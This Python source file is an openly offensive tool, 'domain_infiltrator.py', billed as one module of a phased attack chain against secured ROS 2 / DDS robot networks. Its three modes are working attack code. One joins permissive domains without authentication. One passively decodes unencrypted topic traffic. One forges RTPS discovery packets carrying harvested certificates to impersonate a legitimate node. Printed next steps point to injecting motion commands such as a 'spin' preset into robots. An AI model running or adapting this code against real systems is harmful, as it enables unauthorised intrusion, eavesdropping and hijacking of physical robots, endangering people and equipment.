#!/usr/bin/env python3
"""
domain_infiltrator.py - Phase 5B Module 4: Secured DDS Domain Entry & Topic Exploitation

The culmination of Phase 5B: uses material gathered by Modules 1-3 to actively
infiltrate a secured DDS domain and bridge back to Phase 2 injection capabilities.

Three infiltration modes:

1. DOWNGRADE  (requires: PERMISSIVE governance detected by Module 1/3)
   ─────────────────────────────────────────────────────────────────────
   Sends a standard RTPS SPDP announcement with no security tokens.
   PERMISSIVE mode domains accept unauthenticated participants, so the
   attacker node joins the domain and gains access based on topic access rules.
   Once joined: fall through to Phase 2 (ros2reaper.py inject/impersonate).

2. EAVESDROP  (requires: SIGN-only domain detected by Module 1)
   ──────────────────────────────────────────────────────────────
   In SIGN-only (rtps_protection_kind=SIGN), RTPS payloads are signed but
   NOT encrypted. A passive observer can parse the raw CDR payload directly
   from captured UDP traffic. No authentication required to READ the data.
   Mode listens passively on DDS ports and decodes CDR payloads to stdout.

3. IMPERSONATE (requires: cert.pem + key.pem from cert_harvester, Module 2)
   ─────────────────────────────────────────────────────────────────────────
   Uses a harvested node identity (cert + key) to construct a valid DDS-Security
   identity token and join the secured domain with the victim node's permissions.
   Constructs: PID_IDENTITY_TOKEN, PID_PERMISSIONS_TOKEN, PID_PARTICIPANT_SECURITY_INFO
   in a crafted RTPS SPDP DATA packet. Sends it on the DDS discovery multicast.
   Once joined: bridges to Phase 2 injection using the impersonated node's grants.

Phase chain:
  sros2-intercept → detect SIGN-only / PERMISSIVE / capture tokens
  sros2-harvest   → extract certs / keys from keystore
  sros2-policy    → analyze governance / forge permissions
  sros2-infiltrate→ join secured domain → Phase 2 topic injection

Wire format reference:
  RTPS SPDP DATA with security tokens:
    [RTPS header: magic(4) + version(2) + vendor_id(2) + guid_prefix(12)]
    [INFO_TS submessage: kind(1)+flags(1)+length(2)+time(8)]
    [DATA submessage:
       kind(1)+flags(1)+length(2)+extra_flags(2)+octets_to_inline_qos(2)
       +reader_eid(4)+writer_eid(4)+seq_num(8)
       +rep_id(2)+rep_opt(2)
       +param_list: [PID(2)+len(2)+value]* + PID_SENTINEL]

Author: Gh057x | Phase 5B
"""

import socket
import struct
import time
import json
import sys
import os
import argparse
import random
import threading
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
from enum import Enum
from collections import defaultdict


# =============================================================================
# RTPS Wire Constants
# =============================================================================

RTPS_MAGIC              = b"RTPS"
RTPS_VERSION            = b"\x02\x01"      # v2.1
VENDOR_ID_FAST_DDS      = b"\x01\x0f"      # eProsima Fast DDS (blend in)
VENDOR_ID_CYCLONE       = b"\x01\x10"      # Eclipse Cyclone DDS

SUBMSG_DATA             = 0x15
SUBMSG_INFO_TS          = 0x09
SUBMSG_INFO_DST         = 0x0E

# Entity ID constants (well-known built-in endpoints)
ENTITYID_PARTICIPANT            = b"\x00\x01\x00\xc1"
ENTITYID_SEDP_BUILTIN_PUBLICATIONS_ANNOUNCER   = b"\x00\x00\x03\xc2"
ENTITYID_SPDP_BUILTIN_PARTICIPANT_ANNOUNCER    = b"\x00\x01\x00\xc2"
ENTITYID_UNKNOWN                = b"\x00\x00\x00\x00"

# Parameter IDs
PID_PROTOCOL_VERSION            = 0x0015
PID_VENDOR_ID                   = 0x0016
PID_DEFAULT_UNICAST_LOCATOR     = 0x002F
PID_METATRAFFIC_UNICAST_LOCATOR = 0x0032
PID_PARTICIPANT_GUID            = 0x0050
PID_BUILTIN_ENDPOINT_SET        = 0x0058
PID_DOMAIN_ID                   = 0x000F
PID_PARTICIPANT_LEASE_DURATION  = 0x0002
PID_ENTITY_NAME                 = 0x0062
PID_IDENTITY_TOKEN              = 0x1001
PID_PERMISSIONS_TOKEN           = 0x1002
PID_PARTICIPANT_SECURITY_INFO   = 0x1005
PID_SENTINEL                    = 0x0001

# DDS multicast
DDS_SPDP_MULTICAST_PORT_BASE    = 7400   # domain 0; = 7400 + 250*domainId
DDS_SPDP_MC_ADDR                = "239.255.0.1"

# CDR representation IDs
PL_CDR_LE                       = 0x0003
PL_CDR_BE                       = 0x0002

# Security attribute bitmasks
SEC_ATTR_IS_VALID               = 0x80000000
SEC_ATTR_RTPS_ENCRYPT           = 0x00000003  # SIGN | ENCRYPT
SEC_ATTR_SUBMSG_ENCRYPT         = 0x0000000C
SEC_ATTR_PAYLOAD_ENCRYPT        = 0x00000030


# =============================================================================
# Enums / Dataclasses
# =============================================================================

class InfiltrationMode(str, Enum):
    DOWNGRADE   = "downgrade"
    EAVESDROP   = "eavesdrop"
    IMPERSONATE = "impersonate"


@dataclass
class InfiltrationConfig:
    """Configuration for a domain infiltration attempt."""
    mode: InfiltrationMode
    target_ip: str
    domain_id: int = 0
    duration: float = 30.0
    verbose: bool = False

    # IMPERSONATE mode fields
    cert_pem: Optional[str] = None
    key_pem:  Optional[str] = None
    subject_name: str = ""
    permissions_p7s: Optional[bytes] = None

    # DOWNGRADE mode fields
    spoof_node_name: str = "attacker_node"

    # EAVESDROP mode fields
    decode_cdr: bool = True
    output_file: Optional[str] = None


@dataclass
class CapturedMessage:
    """A raw DDS message captured in EAVESDROP mode."""
    timestamp: str
    source_ip: str
    topic_hint: str = ""
    payload_hex: str = ""
    payload_utf8: str = ""
    cdr_fields: List[str] = field(default_factory=list)
    size: int = 0

    def to_dict(self) -> Dict:
        return {
            "timestamp": self.timestamp,
            "source_ip": self.source_ip,
            "topic_hint": self.topic_hint,
            "size": self.size,
            "payload_hex_preview": self.payload_hex[:64],
            "payload_utf8_preview": self.payload_utf8[:128],
            "cdr_fields": self.cdr_fields[:10],
        }


@dataclass
class InfiltrationResult:
    """Results from a domain infiltration attempt."""
    mode: str
    target: str
    domain_id: int
    duration: float
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    success: bool = False
    packets_sent: int = 0
    packets_captured: int = 0
    messages_decoded: int = 0
    join_confirmed: bool = False
    captured_messages: List[CapturedMessage] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    next_steps: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            "mode": self.mode,
            "target": self.target,
            "domain_id": self.domain_id,
            "duration": self.duration,
            "timestamp": self.timestamp,
            "success": self.success,
            "packets_sent": self.packets_sent,
            "packets_captured": self.packets_captured,
            "messages_decoded": self.messages_decoded,
            "join_confirmed": self.join_confirmed,
            "errors": self.errors,
            "next_steps": self.next_steps,
            "captured_messages": [m.to_dict() for m in self.captured_messages[:50]],
        }


# =============================================================================
# RTPS Packet Builder
# =============================================================================

class RTPSBuilder:
    """Builds raw RTPS packets for SPDP participant announcements."""

    def __init__(self, guid_prefix: Optional[bytes] = None,
                 vendor_id: bytes = VENDOR_ID_FAST_DDS):
        self.guid_prefix = guid_prefix or self._random_guid_prefix()
        self.vendor_id   = vendor_id

    def _random_guid_prefix(self) -> bytes:
        return bytes([random.randint(0, 255) for _ in range(12)])

    def _pack_locator(self, ip: str, port: int) -> bytes:
        """Pack an RTPS Locator_t: kind(4LE) + port(4LE) + address(16)."""
        kind = 1  # LOCATOR_KIND_UDPv4
        addr = socket.inet_aton(ip).rjust(16, b"\x00")
        return struct.pack("<II", kind, port) + addr

    def _pack_param(self, pid: int, value: bytes) -> bytes:
        """Pack a PID + length + value, aligned to 4 bytes."""
        raw_len = len(value)
        pad = (4 - raw_len % 4) % 4
        padded = value + b"\x00" * pad
        return struct.pack("<HH", pid, raw_len) + padded

    def _pack_string(self, s: str) -> bytes:
        encoded = s.encode("utf-8") + b"\x00"
        return struct.pack("<I", len(encoded)) + encoded

    def _make_seq_num(self, high: int = 0, low: int = 1) -> bytes:
        return struct.pack("<iI", high, low)

    def build_spdp_announcement(self, domain_id: int, host_ip: str,
                                 node_name: str = "",
                                 identity_token: Optional[bytes] = None,
                                 permissions_token: Optional[bytes] = None,
                                 security_attrs: int = 0) -> bytes:
        """
        Build a complete RTPS SPDP DATA packet announcing a participant.
        Optionally embeds DDS-Security tokens for IMPERSONATE mode.
        """
        # ── Parameter List ────────────────────────────────────────────────────
        params = b""

        # Protocol version
        params += self._pack_param(PID_PROTOCOL_VERSION, b"\x02\x01\x00\x00")

        # Vendor ID
        params += self._pack_param(PID_VENDOR_ID, self.vendor_id + b"\x00\x00")

        # Domain ID
        params += self._pack_param(PID_DOMAIN_ID, struct.pack("<I", domain_id))

        # Participant GUID
        guid = self.guid_prefix + ENTITYID_PARTICIPANT
        params += self._pack_param(PID_PARTICIPANT_GUID, guid)

        # Builtin endpoint set (SPDP + SEDP + participants)
        endpoint_set = 0x0000033F
        params += self._pack_param(PID_BUILTIN_ENDPOINT_SET, struct.pack("<I", endpoint_set))

        # Default unicast locator (attacker's IP, ephemeral port)
        uc_port = DDS_SPDP_MULTICAST_PORT_BASE + 250 * domain_id + 10
        params += self._pack_param(PID_DEFAULT_UNICAST_LOCATOR,
                                    self._pack_locator(host_ip, uc_port))

        # Metatraffic unicast locator
        params += self._pack_param(PID_METATRAFFIC_UNICAST_LOCATOR,
                                    self._pack_locator(host_ip, uc_port + 1))

        # Lease duration (10 seconds)
        params += self._pack_param(PID_PARTICIPANT_LEASE_DURATION,
                                    struct.pack("<II", 10, 0))

        # Participant name
        if node_name:
            params += self._pack_param(PID_ENTITY_NAME, self._pack_string(node_name))

        # Security tokens (IMPERSONATE mode)
        if identity_token:
            params += self._pack_param(PID_IDENTITY_TOKEN, identity_token)
        if permissions_token:
            params += self._pack_param(PID_PERMISSIONS_TOKEN, permissions_token)
        if security_attrs:
            # participant_security_attributes + plugin_attributes
            params += self._pack_param(PID_PARTICIPANT_SECURITY_INFO,
                                        struct.pack("<II", security_attrs, 0))

        # Sentinel
        params += struct.pack("<HH", PID_SENTINEL, 0)

        # ── Serialized Payload (PL_CDR_LE prefix) ─────────────────────────────
        payload = struct.pack(">HH", PL_CDR_LE, 0) + params

        # ── DATA Submessage ───────────────────────────────────────────────────
        # flags: E (little-endian=1) | D (data present=4) = 0x05
        flags = 0x05
        extra_flags  = b"\x00\x00"
        oct_to_iqos  = struct.pack("<H", 16)  # 4+4+8 = eid+eid+seqnum
        reader_eid   = b"\x00\x01\x00\xc7"   # SPDP builtin reader
        writer_eid   = ENTITYID_SPDP_BUILTIN_PARTICIPANT_ANNOUNCER
        seq_num      = self._make_seq_num(0, random.randint(1, 0xFFFF))

        data_content = (extra_flags + oct_to_iqos + reader_eid + writer_eid +
                        seq_num + payload)
        data_submsg  = (bytes([SUBMSG_DATA, flags]) +
                        struct.pack("<H", len(data_content)) +
                        data_content)

        # ── INFO_TS Submessage ────────────────────────────────────────────────
        t = time.time()
        sec  = int(t)
        frac = int((t - sec) * 2**32)
        ts_submsg = (bytes([SUBMSG_INFO_TS, 0x01]) +
                     struct.pack("<H", 8) +
                     struct.pack("<II", sec, frac))

        # ── RTPS Header ───────────────────────────────────────────────────────
        header = (RTPS_MAGIC + RTPS_VERSION + self.vendor_id + self.guid_prefix)

        return header + ts_submsg + data_submsg


# =============================================================================
# CDR Minimal Decoder (for EAVESDROP mode)
# =============================================================================

class CDRDecoder:
    """
    Minimal CDR decoder for EAVESDROP mode.
    Extracts readable strings and numeric fields from raw CDR payloads.
    """

    def decode(self, data: bytes) -> List[str]:
        fields: List[str] = []
        offset = 0
        # Skip the 4-byte CDR representation prefix if present
        if len(data) >= 4 and data[0] in (0x00, 0x01) and data[1] in (0x00, 0x01):
            offset = 4

        # Scan for printable strings (length-prefixed)
        while offset + 4 < len(data):
            try:
                str_len = struct.unpack_from("<I", data, offset)[0]
                if 1 < str_len < 256 and offset + 4 + str_len <= len(data):
                    candidate = data[offset + 4:offset + 4 + str_len - 1]
                    if all(32 <= b < 127 for b in candidate):
                        fields.append(candidate.decode("ascii"))
                        offset += 4 + str_len
                        while offset % 4: offset += 1
                        continue
            except struct.error:
                pass
            offset += 4

        # Also scan for float pairs (common in Twist, Point messages)
        offset = 4 if len(data) >= 4 else 0
        floats = []
        for i in range(0, min(len(data) - 4, 128), 4):
            try:
                val = struct.unpack_from("<f", data, i)[0]
                if -1000 < val < 1000 and val != 0.0:
                    floats.append(f"{val:.4f}")
            except struct.error:
                pass
        if floats:
            fields.append(f"floats=[{', '.join(floats[:8])}]")

        return fields


# =============================================================================
# Domain Infiltrator
# =============================================================================

class DomainInfiltrator:
    """
    Executes domain infiltration attacks in one of three modes:
    DOWNGRADE, EAVESDROP, or IMPERSONATE.
    """

    def __init__(self, config: InfiltrationConfig):
        self.config  = config
        self.builder = RTPSBuilder()
        self.decoder = CDRDecoder()
        self._running = False

    def _discovery_port(self, domain_id: int) -> int:
        return DDS_SPDP_MULTICAST_PORT_BASE + 250 * domain_id

    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except OSError:
            return "127.0.0.1"

    # ──────────────────────────────────────────────────────────────────────────
    # DOWNGRADE MODE
    # ──────────────────────────────────────────────────────────────────────────

    def run_downgrade(self) -> InfiltrationResult:
        """
        Join a PERMISSIVE domain as an unauthenticated participant.
        Sends SPDP announcements with no security tokens.
        """
        cfg    = self.config
        result = InfiltrationResult(
            mode=InfiltrationMode.DOWNGRADE.value,
            target=cfg.target_ip,
            domain_id=cfg.domain_id,
            duration=cfg.duration,
        )
        port    = self._discovery_port(cfg.domain_id)
        host_ip = self._get_local_ip()

        print(f"\n[*] DOWNGRADE MODE: joining domain {cfg.domain_id} as unauthenticated participant")
        print(f"[*] Target: {cfg.target_ip}  Port: {port}")
        print(f"[*] Local IP: {host_ip}  Node: {cfg.spoof_node_name}")
        print(f"[!] Prerequisite: domain must use allow_unauthenticated_participants=true\n")

        pkt = self.builder.build_spdp_announcement(
            domain_id=cfg.domain_id,
            host_ip=host_ip,
            node_name=cfg.spoof_node_name,
        )

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 32)
            sock.settimeout(2.0)

            start   = time.time()
            seq     = 1
            # Announce repeatedly (DDS re-announces participants periodically)
            while time.time() - start < cfg.duration:
                # Send to multicast
                sock.sendto(pkt, (DDS_SPDP_MC_ADDR, port))
                # Also send unicast if target specified
                if cfg.target_ip and cfg.target_ip != "0.0.0.0":
                    sock.sendto(pkt, (cfg.target_ip, port))
                result.packets_sent += 1
                seq += 1

                if cfg.verbose:
                    print(f"  [→] SPDP announcement #{seq}: {len(pkt)} bytes → "
                          f"{DDS_SPDP_MC_ADDR}:{port}")

                # Listen for responses (SPDP replies indicate join)
                try:
                    data, (src, _) = sock.recvfrom(65535)
                    if data[:4] == RTPS_MAGIC and src != host_ip:
                        result.join_confirmed = True
                        result.packets_captured += 1
                        if cfg.verbose:
                            print(f"  [←] SPDP response from {src} ({len(data)} bytes) — "
                                  f"participant accepted by domain!")
                except socket.timeout:
                    pass

                time.sleep(2.0)  # DDS default lease / announcement interval

            sock.close()
            result.success = True

        except PermissionError:
            result.errors.append("PermissionError: run as root to send multicast packets")
        except OSError as e:
            result.errors.append(str(e))

        result.next_steps = [
            "If join_confirmed=true: run Phase 2 modules against now-accessible topics",
            f"python3 ros2reaper.py inject --namespace /<robot> --preset spin --domain-id {cfg.domain_id}",
            f"python3 ros2reaper.py enumerate --target {cfg.target_ip} --domain-id {cfg.domain_id}",
        ]
        return result

    # ──────────────────────────────────────────────────────────────────────────
    # EAVESDROP MODE
    # ──────────────────────────────────────────────────────────────────────────

    def run_eavesdrop(self) -> InfiltrationResult:
        """
        Passively capture and decode topic payloads from a SIGN-only domain.
        In SIGN mode, the CDR payload is signed but NOT encrypted — fully readable.
        """
        cfg    = self.config
        result = InfiltrationResult(
            mode=InfiltrationMode.EAVESDROP.value,
            target=cfg.target_ip,
            domain_id=cfg.domain_id,
            duration=cfg.duration,
        )
        port = self._discovery_port(cfg.domain_id)
        # Also listen on user-data multicast port
        user_port = port + 1

        print(f"\n[*] EAVESDROP MODE: capturing plaintext payloads from SIGN-only domain {cfg.domain_id}")
        print(f"[*] Listening on ports {port} and {user_port}  (no packets sent)\n")

        socks: List[socket.socket] = []
        for p in [port, user_port]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                try:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                except AttributeError:
                    pass
                s.bind(("", p))
                mreq = socket.inet_aton(DDS_SPDP_MC_ADDR) + socket.inet_aton("0.0.0.0")
                try:
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
                except OSError:
                    pass
                s.settimeout(0.5)
                socks.append(s)
            except OSError as e:
                result.errors.append(f"port {p}: {e}")

        if not socks:
            result.errors.append("No sockets available — run as root")
            return result

        start      = time.time()
        seen_guids: Dict[str, int] = defaultdict(int)

        while time.time() - start < cfg.duration:
            for s in socks:
                try:
                    data, (src_ip, _) = s.recvfrom(65535)
                    result.packets_captured += 1

                    if data[:4] != RTPS_MAGIC:
                        continue

                    # Extract payloads from DATA submessages
                    msgs = self._extract_data_payloads(data, src_ip)
                    for msg in msgs:
                        result.captured_messages.append(msg)
                        result.messages_decoded += 1
                        if cfg.verbose:
                            print(f"  [←] {src_ip}: {msg.size}B  "
                                  f"fields={msg.cdr_fields[:3]}")

                except socket.timeout:
                    continue
                except OSError:
                    break

            elapsed = time.time() - start
            if int(elapsed) % 5 == 0 and cfg.verbose:
                sys.stdout.write(f"\r  [{elapsed:.0f}s]  pkts={result.packets_captured}  "
                                 f"msgs={result.messages_decoded}  ")
                sys.stdout.flush()

        print()
        for s in socks:
            try: s.close()
            except OSError: pass

        result.success = result.messages_decoded > 0
        result.next_steps = [
            "Review captured_messages for topic payload data (sensor readings, commands)",
            "Look for Twist floats → /cmd_vel control commands",
            "Look for string fields → topic names, node parameters, status messages",
            f"Save to JSON (-o output.json) and grep for sensitive field patterns",
        ]
        return result

    def _extract_data_payloads(self, rtps: bytes, src_ip: str) -> List[CapturedMessage]:
        messages = []
        if len(rtps) < 20:
            return messages

        offset = 20  # skip RTPS header
        while offset + 4 <= len(rtps):
            kind  = rtps[offset]
            flags = rtps[offset + 1]
            little = bool(flags & 0x01)
            fmt = "<H" if little else ">H"
            try:
                length = struct.unpack_from(fmt, rtps, offset + 2)[0]
            except struct.error:
                break

            if kind == SUBMSG_DATA:
                smsg = rtps[offset + 4: offset + 4 + length]
                payload = self._get_data_payload(smsg, flags)
                if payload and len(payload) > 8:
                    fields = self.decoder.decode(payload) if self.config.decode_cdr else []
                    msg = CapturedMessage(
                        timestamp=datetime.now().isoformat(),
                        source_ip=src_ip,
                        size=len(payload),
                        payload_hex=payload.hex(),
                        payload_utf8=payload.decode("utf-8", errors="replace")[:256],
                        cdr_fields=fields,
                    )
                    messages.append(msg)

            offset += 4 + length
            if length == 0:
                break

        return messages

    def _get_data_payload(self, data: bytes, flags: int) -> Optional[bytes]:
        """Extract the serialized payload from a DATA submessage body."""
        has_data = bool(flags & 0x04)
        if not has_data or len(data) < 20:
            return None
        # Skip: extra_flags(2)+oct_to_iqos(2)+reader_eid(4)+writer_eid(4)+seq_num(8) = 20
        payload = data[20:]
        if len(payload) < 4:
            return None
        # Skip 4-byte representation prefix
        rep_id = struct.unpack_from(">H", payload, 0)[0]
        # PL_CDR (param list) = skip; regular CDR = return payload
        if rep_id in (PL_CDR_LE, PL_CDR_BE):
            return None  # Skip discovery traffic; we want user data
        return payload[4:] if len(payload) > 4 else None

    # ──────────────────────────────────────────────────────────────────────────
    # IMPERSONATE MODE
    # ──────────────────────────────────────────────────────────────────────────

    def run_impersonate(self) -> InfiltrationResult:
        """
        Construct a valid DDS-Security participant using harvested certificate
        material (cert.pem + key.pem from Module 2) and announce it on the
        DDS discovery multicast. The target domain validates the identity token
        against its CA — if the cert was signed by the domain CA, the node is accepted.
        """
        cfg    = self.config
        result = InfiltrationResult(
            mode=InfiltrationMode.IMPERSONATE.value,
            target=cfg.target_ip,
            domain_id=cfg.domain_id,
            duration=cfg.duration,
        )
        port    = self._discovery_port(cfg.domain_id)
        host_ip = self._get_local_ip()

        if not cfg.cert_pem:
            result.errors.append("--cert required for impersonate mode (from sros2-harvest)")
            return result

        print(f"\n[*] IMPERSONATE MODE: injecting participant with harvested identity")
        print(f"[*] Target: {cfg.target_ip}  Domain: {cfg.domain_id}  Port: {port}")
        print(f"[*] Subject: {cfg.subject_name or '(from cert)'}\n")

        # Build a minimal identity token embedding the PEM certificate
        identity_token  = self._build_identity_token(cfg.cert_pem, cfg.subject_name)
        permissions_token = self._build_permissions_token(cfg.permissions_p7s)

        # Security attributes: claim full encrypt (match the domain's expected level)
        sec_attrs = SEC_ATTR_IS_VALID | SEC_ATTR_RTPS_ENCRYPT | SEC_ATTR_SUBMSG_ENCRYPT

        pkt = self.builder.build_spdp_announcement(
            domain_id=cfg.domain_id,
            host_ip=host_ip,
            node_name=cfg.spoof_node_name,
            identity_token=identity_token,
            permissions_token=permissions_token,
            security_attrs=sec_attrs,
        )

        print(f"[*] SPDP packet: {len(pkt)} bytes  "
              f"(identity_token={len(identity_token)}B  "
              f"permissions_token={len(permissions_token)}B)")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 32)
            sock.settimeout(2.0)

            start = time.time()
            seq   = 1
            while time.time() - start < cfg.duration:
                sock.sendto(pkt, (DDS_SPDP_MC_ADDR, port))
                if cfg.target_ip and cfg.target_ip not in ("", "0.0.0.0"):
                    sock.sendto(pkt, (cfg.target_ip, port))
                result.packets_sent += 1
                seq += 1

                if cfg.verbose:
                    print(f"  [→] SPDP announce #{seq} with identity_token → {DDS_SPDP_MC_ADDR}:{port}")

                try:
                    data, (src, _) = sock.recvfrom(65535)
                    if data[:4] == RTPS_MAGIC:
                        result.join_confirmed = True
                        result.packets_captured += 1
                        print(f"  [←] Response from {src} — DDS participant handshake initiated!")
                except socket.timeout:
                    pass

                time.sleep(2.0)

            sock.close()
            result.success = True

        except PermissionError:
            result.errors.append("PermissionError: run as root for raw socket access")
        except OSError as e:
            result.errors.append(str(e))

        result.next_steps = [
            "If join_confirmed: domain initiated DDS-Security handshake",
            "Full handshake requires a DDS stack (rclpy + matching SROS2 env).",
            "For full session: configure SROS2 keystore with harvested cert/key,",
            f"  set ROS_SECURITY_KEYSTORE and launch ROS 2 nodes on domain {cfg.domain_id}",
            "Then use Phase 2 modules with the node's permissions for topic injection.",
        ]
        return result

    def _build_identity_token(self, cert_pem: str, subject_name: str) -> bytes:
        """
        Construct a minimal DDS:Auth:PKI-DH:1.0 identity token embedding
        the identity certificate as the 'c.id' binary property.
        Wire format: class_id(str4) + properties(seq) + binary_properties(seq)
        """
        class_id = b"DDS:Auth:PKI-DH:1.0\x00"
        # Pack class_id as length-prefixed string
        cid_packed = struct.pack("<I", len(class_id)) + class_id
        # Align to 4
        while len(cid_packed) % 4: cid_packed += b"\x00"

        # Empty properties sequence
        props = struct.pack("<I", 0)

        # Binary properties: one entry "c.id" = PEM bytes
        cert_bytes = cert_pem.encode("utf-8")
        bprop_name  = b"c.id\x00"
        bprop_name_packed = struct.pack("<I", len(bprop_name)) + bprop_name
        while len(bprop_name_packed) % 4: bprop_name_packed += b"\x00"

        bprop_val_packed  = struct.pack("<I", len(cert_bytes)) + cert_bytes
        while len(bprop_val_packed) % 4: bprop_val_packed += b"\x00"

        propagate = b"\x01\x00\x00\x00"  # propagate=true, padded
        bprop_entry = bprop_name_packed + bprop_val_packed + propagate

        bin_props = struct.pack("<I", 1) + bprop_entry  # count=1

        return cid_packed + props + bin_props

    def _build_permissions_token(self, p7s_bytes: Optional[bytes]) -> bytes:
        """
        Construct a DDS:Access:Permissions:1.0 permissions token.
        If p7s_bytes provided, embeds the signed permissions document.
        Otherwise, builds a minimal empty token (for PERMISSIVE domains).
        """
        class_id = b"DDS:Access:Permissions:1.0\x00"
        cid_packed = struct.pack("<I", len(class_id)) + class_id
        while len(cid_packed) % 4: cid_packed += b"\x00"

        if p7s_bytes:
            bprop_name = b"dds.sec.permissions.doc\x00"
            bprop_name_packed = struct.pack("<I", len(bprop_name)) + bprop_name
            while len(bprop_name_packed) % 4: bprop_name_packed += b"\x00"
            bprop_val_packed  = struct.pack("<I", len(p7s_bytes)) + p7s_bytes
            while len(bprop_val_packed) % 4: bprop_val_packed += b"\x00"
            propagate = b"\x01\x00\x00\x00"
            bin_props = struct.pack("<I", 1) + bprop_name_packed + bprop_val_packed + propagate
        else:
            bin_props = struct.pack("<I", 0)

        props = struct.pack("<I", 0)
        return cid_packed + props + bin_props

    # ──────────────────────────────────────────────────────────────────────────
    # Dispatch
    # ──────────────────────────────────────────────────────────────────────────

    def run(self) -> InfiltrationResult:
        mode = self.config.mode
        if mode == InfiltrationMode.DOWNGRADE:
            return self.run_downgrade()
        elif mode == InfiltrationMode.EAVESDROP:
            return self.run_eavesdrop()
        elif mode == InfiltrationMode.IMPERSONATE:
            return self.run_impersonate()
        else:
            result = InfiltrationResult(mode=str(mode), target=self.config.target_ip,
                                         domain_id=self.config.domain_id, duration=0)
            result.errors.append(f"Unknown mode: {mode}")
            return result


# =============================================================================
# Output
# =============================================================================

CYAN    = "\033[96m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
RED     = "\033[91m"
DIM     = "\033[90m"
RESET   = "\033[0m"
BOLD    = "\033[1m"


def print_infiltration_report(result: InfiltrationResult):
    mode_colors = {
        "downgrade":   YELLOW,
        "eavesdrop":   CYAN,
        "impersonate": RED,
    }
    mc = mode_colors.get(result.mode, "")

    print(f"\n{'=' * 65}")
    print(f"  {BOLD}DOMAIN INFILTRATION REPORT{RESET}")
    print(f"{'=' * 65}")
    print(f"  Mode:        {mc}{result.mode.upper()}{RESET}")
    print(f"  Target:      {result.target}")
    print(f"  Domain ID:   {result.domain_id}")
    print(f"  Duration:    {result.duration:.1f}s")
    print(f"  Timestamp:   {result.timestamp}")
    print(f"{'─' * 65}")

    status_color = GREEN if result.success else RED
    join_color   = GREEN if result.join_confirmed else YELLOW
    print(f"\n  Status:           {status_color}{'SUCCESS' if result.success else 'FAILED'}{RESET}")
    print(f"  Packets sent:     {result.packets_sent}")
    print(f"  Packets captured: {result.packets_captured}")
    print(f"  Messages decoded: {result.messages_decoded}")
    print(f"  Join confirmed:   {join_color}{'YES' if result.join_confirmed else 'NOT YET'}{RESET}")

    if result.errors:
        print(f"\n  {RED}Errors:{RESET}")
        for e in result.errors:
            print(f"    {DIM}{e}{RESET}")

    if result.captured_messages:
        print(f"\n  {BOLD}Captured Messages (sample){RESET}")
        print(f"{'─' * 65}")
        for msg in result.captured_messages[:10]:
            print(f"\n  [{msg.timestamp[11:19]}] {msg.source_ip:<16}  {msg.size}B")
            if msg.cdr_fields:
                print(f"    Fields: {msg.cdr_fields[:5]}")
            elif msg.payload_utf8.strip():
                preview = msg.payload_utf8[:80].replace("\n", "\\n")
                print(f"    Text:   {DIM}{preview}{RESET}")

    if result.next_steps:
        print(f"\n  {BOLD}Next Steps{RESET}")
        for step in result.next_steps:
            print(f"    {CYAN}→{RESET} {step}")

    print(f"\n{'=' * 65}\n")


def export_json(result: InfiltrationResult, path: str):
    with open(path, "w") as f:
        json.dump(result.to_dict(), f, indent=2)
    print(f"[+] Infiltration results saved to {path}")


# =============================================================================
# Standalone CLI
# =============================================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDS Domain Infiltrator (Phase 5B Module 4)")
    parser.add_argument("--mode", choices=["downgrade", "eavesdrop", "impersonate"],
                        required=True, help="Infiltration mode")
    parser.add_argument("--target", "-t", default="", help="Target IP address")
    parser.add_argument("--domain-id", "-d", type=int, default=0, help="DDS Domain ID")
    parser.add_argument("--duration", type=float, default=30.0, help="Duration in seconds")
    parser.add_argument("--cert",     default=None, help="Node certificate PEM (impersonate mode)")
    parser.add_argument("--key",      default=None, help="Node private key PEM (impersonate mode)")
    parser.add_argument("--permissions", default=None, help="Signed permissions.p7s path")
    parser.add_argument("--node-name",   default="attacker_node", help="Spoofed node name")
    parser.add_argument("--subject-name", default="", help="Subject DN from cert")
    parser.add_argument("-o", "--output", help="Save JSON output to file")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    cert_pem = None
    if args.cert:
        try:
            with open(args.cert) as f: cert_pem = f.read()
        except OSError as e:
            print(f"[-] Cannot read cert: {e}"); sys.exit(1)

    perm_bytes = None
    if args.permissions:
        try:
            with open(args.permissions, "rb") as f: perm_bytes = f.read()
        except OSError as e:
            print(f"[-] Cannot read permissions: {e}"); sys.exit(1)

    cfg = InfiltrationConfig(
        mode=InfiltrationMode(args.mode),
        target_ip=args.target,
        domain_id=args.domain_id,
        duration=args.duration,
        verbose=args.verbose,
        cert_pem=cert_pem,
        permissions_p7s=perm_bytes,
        spoof_node_name=args.node_name,
        subject_name=args.subject_name,
    )

    infiltrator = DomainInfiltrator(cfg)
    result = infiltrator.run()
    print_infiltration_report(result)

    if args.output:
        export_json(result, args.output)
